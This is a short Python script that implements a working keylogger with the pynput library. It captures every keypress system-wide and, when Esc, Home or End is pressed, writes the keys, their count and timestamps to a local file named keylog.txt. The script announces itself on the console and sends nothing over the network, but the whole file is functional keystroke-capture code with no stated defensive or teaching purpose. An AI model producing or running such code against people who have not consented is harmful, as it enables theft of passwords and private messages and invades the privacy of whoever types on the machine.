import os
import datetime as dt
from arcade import key
from pynput.keyboard import Key, Listener

t= ''
keys = []
count = 0


def on_press(key):
    global keys, count, t
    keys.append(key)
    count += 1


def writeKeyLog(keys):
    file = 'keylog.txt'
    if file in os.listdir():
        f = open(file, 'a')
    else:
        f = open(file, 'w')

    f.write(f'\n---------------------------------------------------\n')
    f.write(f'\n Keylogging Started : {t}\n\n')

    keyd = {Key.enter: ' |ent-> ', Key.shift: ' SHIFT ',
            Key.space: ' |__| ', Key.backspace: ' <b- ',
            Key.ctrl_l: ' CTRL ', Key.esc: ' END ',
            Key.home: ' END ', Key.end: ' END '}

    for k in keys:
        if k in keyd:
            f.write(keyd[k])
            if k == Key.enter:
                f.write('\n')
        else:
            f.write(str(k))

    f.write(f'\n\n Keys Pressed : {count}')
    f.write(f'\n Keylogging Ended : {dt.datetime.now()}')
    f.write(
        f'\n---------------------------------------------------\n\n')
    f.close()


def on_release(key):
    end = [Key.esc, Key.home, Key.end]
    if key in end:
        writeKeyLog(keys)
        print(f'\n Keylogging Ended : {dt.datetime.now()}')
        return False
    pass

t= dt.datetime.now()
print(f'\n Keylogging Started : {t}')
with Listener(on_press=on_press, on_release=on_release) as l:
    l.join()
